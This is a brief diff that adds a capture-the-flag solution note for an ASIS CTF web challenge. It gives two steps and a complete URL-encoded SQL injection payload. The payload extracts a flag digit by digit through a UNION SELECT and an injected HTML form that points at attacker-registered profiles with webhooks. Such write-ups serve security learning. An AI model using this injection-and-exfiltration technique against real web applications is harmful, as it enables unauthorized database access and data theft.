@@ -1,0 +1,5 @@
+1. Register 10 users with different webhooks in avatar
+2. Leak 1 digit from the flag ascii per request
+```
+https://maskstore.asisctf.com/panel?orderid=%27+union+select+@a:=cast(substr(((select+ascii(substr(flag,27,1))+from+secrets+limit+0,1)),3,1)+as+decimal)%2Cconcat(%27%3C/p%3E%3C/div%3E%3Cdiv%3E%3C/div%3E%3Cform%20action=/profile/%27,COALESCE(IF(@a=1,%2748940bcc-12e1-4d73-98c2-b2a12b7a30b6%27,NULL),IF(@a=2,%2778ab1aee-cbc2-4d9c-b76a-af3d37141047%27,NULL),IF(@a=3,%27bfd3f36b-cf67-4545-9e81-b5cb525ec963%27,NULL),IF(@a=4,%27f88175a9-f28f-4884-a777-150842b638eb%27,NULL),IF(@a=5,%272d2ee06c-bf00-480c-9ed1-f7b321fd3fbf%27,NULL),IF(@a=6,%277be9cd13-2133-42a4-9a28-5ead2be29244%27,NULL),IF(@a=7,%275441f570-0105-43b3-a694-f038c4306857%27,NULL),IF(@a=8,%27d0ea444e-aba1-4203-b778-b239354334bb%27,NULL),IF(@a=9,%274490d416-6493-45f3-a8f0-a03f0b4046d3%27,NULL),IF(@a=0,%279679ab79-dd86-4b57-909e-471d3a689ec8%27,NULL)),%27%3E%3C!--%27)--+-
+```
